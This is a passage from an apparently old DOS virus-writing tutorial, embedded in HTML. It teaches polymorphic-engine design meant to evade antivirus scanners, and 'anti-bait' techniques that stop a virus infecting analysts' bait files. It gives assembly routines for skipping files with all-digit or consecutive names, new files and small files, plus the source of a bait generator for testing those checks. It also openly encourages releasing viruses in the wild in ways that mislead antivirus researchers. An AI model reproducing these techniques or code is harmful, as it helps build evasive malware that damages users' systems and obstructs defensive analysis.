+<p>Also, if you wanted to be really sly (and I know you do), you could use the above method, but then release the virus in the wild, with its generation counter set to something like 16. This way, no one will see the first 2 methods, until the generation counter has carried over. About a week after releasing it, you could release it somewhere else, so that the AV people will get the first specimen, and their algorithm will be missing the first two methods, while the second infection you release can have the counter set to 0, so that the decryptors using the first two methods will be in the wild, and will spread, before the AV realise their mistake.</p>
+<p>Another thing you could base your slow poly on, is the file you are infecting. For example, let us imagine you based the above example on the SIZE of the file to be infected, divided by 1000, rather then the <strong>generation</strong> divided by 8. Since the bait files will be of the same or similar size, little to no change will be seen. If a different file of a different size was infected however, you would have a totally different decryptor!</p>
+<h3><a name="c13"></a>Make No Two Conditions Dependant</h3>
+<p>One of the biggest mistakes you could make when coding an engine is making two conditions dependant on the same thing. For example let us imagine that you made both the index register used, and the decryption method used dependant on the month. This could possibly mean, that when XOR encryption is used, you can guarantee BX is the index register, and when ADD is used SI will be the index register. This way, all they have to do is check for a XOR [SI],?? instruction or a ADD [BX],??. If you made this mistake, and had four index registers, and four decryption methods, the scanner need only to check for four possible instructions. However, if these were decided on totally independant criteria, they would have to check for 16 different instructions, increasing the chance of false positives. For another example, let us look at the following:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">code_jmp<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3f</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;this code will generate a random </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; get_rand&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;conditional jump, to a random offset </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">al</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;between 0 adn 3f bytes from the </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">70</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;jump. Note that the conditional </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosw</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;jumps are 70h -&gt; 7fh. </span><br/>
+&nbsp;</div>
+<p>The above example will always generate, a working, conditional jump. It does however have a fairly obvious flaw. If the jump opcode is 70h then the offset of the jump will be 0, 10h, 20h, or 30h. If the jump opcode is 70h then the offset of the jump will be 1, 11h, 21h, or 31h. This will remain true for all of 70h to 7fh. This is very dangerous, as a scanner could something like this in its algorithm:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;This code fragment, is assumed to be part of a scanner that is tracing </span><br/>
+<span style="color: black; font-style: italic;">;through the code it scans. It is assumed that DS:SI points to the current </span><br/>
+<span style="color: black; font-style: italic;">;instruction being processed.</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lodsw</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">70</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jb</span>&nbsp; &nbsp; &nbsp; not_cond_jmp<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">7f</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;checks if we are dealing with a </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ja</span>&nbsp; &nbsp; &nbsp; not_cond_jmp&nbsp; &nbsp; <span style="color: black; font-style: italic;">;conditional jump. </span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>0f0f &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;If the jump was generated with the </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ah</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;above example, AL will always = AH. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; file_not_infected<br/>
+<br/>
+not_cond_jmp<span style="color: #339933;">:</span><br/>
+&nbsp;</div>
+<p>As you can see, if many things are dependant on each other, an algorithm could be used that uses techniques like the above, and if all rules are followed, safely assume the file was infected. To avoid the above check, the conditional jump coder should be something like this:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3f</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; get_rand<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">al</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0f</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; get_rand<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">70</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bl</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosw</span><br/>
+&nbsp;</div>
+<p>As you can see, in the above example, the offset of the jump is totally independant of the jumps opcode. This will make the detection algorithm alot harder to devise.</p>
+<h2><a name="c2"></a>Anti-Bait Technique</h2>
+<p><em>Hate your enemies</em></p>
+<p>By using the methods explained in the previous section, we can safely say that the AV can not simply set the bait maker to generate 10,000 bait files, with the virus in memory, and get an accurate and complete of what is necessary. Instead they must use many varying files, reboot the system thousands of times to change the date, and fiddle with the generation counter, which will significantly slow things down. But let us take things a step further: let us imagine that the virus won't even infect the files in the first place. This would simply involve putting the candidate file through a number of tests, and if it fails any of them, saying the file could be a bait, and not infecting them. This section simply looks at what some of these test could entail.</p>
+<h3><a name="c21"></a>The Obvious</h3>
+<p>The are two very obvious and easy test your virus <em>should</em> have:</p>
+<ol>
+<li>It should not infect new files.</li>
+<li>It should not infect small files.</li>
+</ol>
+<p>New files should not be infected, as the files created by a bait maker will usually look new. Simply grab the current date, and compare it to the date stamp of the file. It is the same? Well then dont infect! It should be noted that this is easilly defeated, if the bait maker sets the files date stamp to a random date, before closing it.</p>
+<p>The files created by bait makers, will usually be fairly small, so small files should be avoided. I would recommend that you avoid files smaller then between 5,000 and 10,000 bytes. The smaller you make this limit, the less chance there is that a legitimate file will be wrongly be left uninfected, but it is also more likely that a bad bait file will wrongly be infected. By making the limit larger, the greater the chance there is that a legitimate file will be wrongly be left uninfected, but its also more likely that a bait file will correctly be left uninfected. High limit or Low limit? The choice is yours... This could easilly be defeated if the bait maker created files which were, say, 50,000 bytes. This size is obviously far to large to avoid, as it is larger then many legitimate programs. You should also remember however that 10,240 files at 5,000 bytes will use 52 megabytes, so if the bait files were 50,000 bytes long, this figure would go upto 520 megabytes! Most test computers do not have such lard hard drives, so it is safe to assume that the bait files will be small.</p>
+<p>As the above two methods are so easy to implement, I will not bother to supply any example code.</p>
+<h3><a name="c22"></a>Anti-Bait Techniques: Avoid Digital File Names</h3>
+<p>Most bait makers create filenames like '00000000.com' followed by '00000001.com'. All the file are names composed of the characters '0' to '9'. We could have a check in our virus, to ensure that this is not true, and if it is, not infect the file, as shown below:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;This code avoids file names composed entirely of digits. It is assumed </span><br/>
+<span style="color: black; font-style: italic;">;that the file has already been opened, and that its file handle is in </span><br/>
+<span style="color: black; font-style: italic;">;BX. get_sft_bx is assumed to be a sub-procedure that returns ES:DI pointing </span><br/>
+<span style="color: black; font-style: italic;">;to the SFT entry of the handle in BX (the file to be infected). </span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; get_sft_bx<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">di</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #ff0000;">20</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;File names in at offset 20h of SFT </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;8 characters in name (padded with spaces) </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cld</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;increment SI on LODSB</span><br/>
+<br/>
+check_name<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: #00007f; font-weight: bold;">lodsb</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'0'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jb</span>&nbsp; &nbsp; &nbsp; name_safe<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'9'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ja</span>&nbsp; &nbsp; &nbsp; name_safe &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;character is not digit, so it is safe </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">20</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;check for space if equal, end of name has </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; not_safe&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;been reached, with only digits encounters. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;which means it is possibly bait. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">loop</span>&nbsp; &nbsp; check_name&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;check next character</span><br/>
+<br/>
+not_safe<span style="color: #339933;">:</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; exit_infect &nbsp; &nbsp; <span style="color: black; font-style: italic;">;end of name reached with only digits so </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;do not infect</span><br/>
+name_safe<span style="color: #339933;">:</span><br/>
+&nbsp;</div>
+<p>This method could easilly be defeated by using file names like 'AAAAAAAA.COM' instead of '00000000.com'.</p>
+<h3><a name="c23"></a>Avoid Consecutive File Names</h3>
+<p>Many people consider this method overkill, but it is extremely effective, if you are serious about your Post-Discovery-Stratagies. It works by checking if the currents file to be infected, has a consecutive file name of the previous filename. For example, if the previous file to be infected was called 'AAAAAAAA.COM' you would not infect the next file if it was called 'AAAAAAAB.COM'. The easiest way to do this, is save the sum of the characters of the file name. If the next file is consecutive to it, the sum will be the sum of the previous one + 1. i.e:</p>
+<p>'AAAAAAAA' = 'A' + 'A' + 'A' + 'A' + 'A' + 'A' + 'A' + 'A' = 208h</p>
+<p>'AAAAAAAB' = 'A' + 'A' + 'A' + 'A' + 'A' + 'A' + 'A' + 'B' = 209h</p>
+<p>Therefore, of the filename of your candidate file, and use it to check if the next file to be infected is consecutive. If it is do not infect! Example:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;This code avoids infecting files with consecutive filenames. It is assumed </span><br/>
+<span style="color: black; font-style: italic;">;that the file has already been opened, and that its file handle is in </span><br/>
+<span style="color: black; font-style: italic;">;BX. get_sft_bx is assumed to be a sub-procedure that returns ES:DI pointing </span><br/>
+<span style="color: black; font-style: italic;">;to the SFT entry of the handle in BX (the file to be infected). </span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; get_sft_bx<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">di</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #ff0000;">20</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;File names in at offset 20h of SFT </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;8 characters in name (padded with spaces) </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cld</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;increment SI on LODSB</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
+<br/>
+check_consecutive<span style="color: #339933;">:</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: #00007f; font-weight: bold;">lodsb</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">20</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;check for space</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; end_cc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;if space, end of name rached </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;add character to sum</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">loop</span>&nbsp; &nbsp; check_consecutive<br/>
+<br/>
+end_cc<span style="color: #339933;">:</span> <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>last_sum&nbsp; <span style="color: black; font-style: italic;">;the sum of the last filename </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>last_sum<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bx</span>&nbsp; <span style="color: black; font-style: italic;">;save the sum of this file name for next time </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; dont_infect<br/>
+&nbsp;</div>
+<p>The above code is fairly lengthy, and messy, but it works! You should also not infect a file, if it is the same length as the previous file, for obvious reasons. This code could by defeated by incrementing filename by values other then 1, or even by incrementing it by a <strong>random</strong> amount each time.</p>
+<p>To help you test your Anti-Bait code, I have put together a Bait Generator (Sepultura's Funky Bait Maker), which can be modified to show how each of the above methods are defeated. Here is the complete source:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;SFBM.ASM compile with A86</span><br/>
+<br/>
+<span style="color: black; font-style: italic;">;This is a bait maker that in its original state, will fail to defeat all </span><br/>
+<span style="color: black; font-style: italic;">;of the above mentioned techniques. However, by making the modifications </span><br/>
+<span style="color: black; font-style: italic;">;described through out the code, all of the above techniques will fail </span><br/>
+<span style="color: black; font-style: italic;">;miserably.</span><br/>
+<br/>
+<span style="color: black; font-style: italic;">;By changing the Below EQUates, and (un)commenting certain code below, you </span><br/>
+<span style="color: black; font-style: italic;">;can test the various technique described above, as well as any other Anti- </span><br/>
+<span style="color: black; font-style: italic;">;Bait Technique you think off..</span><br/>
+<br/>
+number_of_files <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: #ff0000;">200</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">;number of bait files to genrate </span><br/>
+<br/>
+file_length &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: #ff0000;">5000</span>&nbsp; &nbsp; <span style="color: black; font-style: italic;">;length of bait file. Change this to </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;catchout virii that do not infect </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;small files. (minimum 38, maximum </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;65,279).</span><br/>
+<br/>
+first_character <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: #7f007f;">'0'</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Changing these two equates to 'A' to </span><br/>
+last_character&nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: #7f007f;">'9'</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">;'Z' will fool virii that check if </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;the filename is entirely numbers.. </span><br/>
+character_range <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: black;">&#40;</span>last_character <span style="color: #339933;">-</span> first_character<span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: #ff0000;">1</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;This is used to calculate the filename.. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; radix &nbsp; <span style="color: #ff0000;">16</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; <span style="color: #ff0000;">100</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cs</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">9</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>offset gen_msg<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;prints intro message.. </span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>number_of_files&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;200 bait files</span><br/>
+<br/>
+file_loop<span style="color: #339933;">:</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>offset filename<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>3c02 &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;CREATE/TRUNCATE &quot;filename&quot; </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;BX = Handle. I used a MOV, so </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;AH stays = to 0</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>offset bait<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>file_length&nbsp; <span style="color: black; font-style: italic;">;file is 5000 bytes long </span><br/>
+<br/>
+<span style="color: black; font-style: italic;">;Uncomment the IN, and ADD below, so the length of the bait becomes </span><br/>
+<span style="color: black; font-style: italic;">;between FILE_LENGTH and (FILE_LENGTH + 255). This is to catchout </span><br/>
+<span style="color: black; font-style: italic;">;virii that wont infect a file if its the same size as the last file. </span><br/>
+<span style="color: black; font-style: italic;">;in &nbsp;al,40</span><br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; add &nbsp; &nbsp; cx,ax</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Write Bait Program to file.. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21</span><br/>
+<br/>
+<span style="color: black; font-style: italic;">;Uncommenting the below CALL, will cause SFBM to set each file </span><br/>
+<span style="color: black; font-style: italic;">;to a random date, before closing, avoiding virii which dont </span><br/>
+<span style="color: black; font-style: italic;">;infect new files.</span><br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; call set_date</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br/>
